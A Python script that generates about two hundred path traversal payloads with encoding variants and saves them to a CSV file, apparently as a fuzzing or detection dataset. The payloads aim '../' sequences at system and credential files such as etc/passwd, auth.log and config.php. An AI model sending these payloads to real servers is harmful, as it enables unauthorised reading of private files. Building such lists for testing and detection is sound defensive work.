import pandas as pd
import os
import urllib.parse

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

files = [
    "etc/passwd",
    "var/log/auth.log",
    "windows/system.ini",
    "boot.ini",
    "config.php",
    "web.xml",
    "application.properties"
]

payloads = []

# generate deterministic unique payloads
for depth in range(1, 8):
    for f in files:
        base = "../" * depth + f
        payloads.append(base)
        payloads.append(base.replace("/", "//"))
        payloads.append(urllib.parse.quote(base))
        payloads.append(base.replace(".", "%2e"))

# trim or extend safely
payloads = payloads[:3000]

df = pd.DataFrame({"payload": payloads})
df.to_csv(os.path.join(BASE_DIR, "path_traversal.csv"), index=False)

print(f"✅ {len(df)} UNIQUE Path Traversal payloads generated safely")
